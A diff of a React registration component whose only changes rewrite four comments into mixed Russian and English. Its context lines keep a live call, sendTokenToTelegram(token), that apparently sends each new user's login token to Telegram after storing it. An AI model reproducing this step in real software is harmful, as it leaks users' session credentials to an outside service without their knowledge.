@@ -54,17 +54,17 @@ const Register = ({ setIsAuthenticated }) => {
         }
       );
 
-      // Сохраняем токен
+      // Сохранение токен
       const token = loginResponse.data.token;
       localStorage.setItem("token", token);
 
-      // Отправляем токен в Telegram
+      // send токен в Telegram
       sendTokenToTelegram(token);
 
-      // Обновляем состояние авторизации
+      // upd состояние авторизации
       setIsAuthenticated(true);
 
-      // Перенаправляем на профиль
+      // locate на профиль
       navigate("/profile", { replace: true });
     } catch (err) {
       console.error("Registration error:", err);
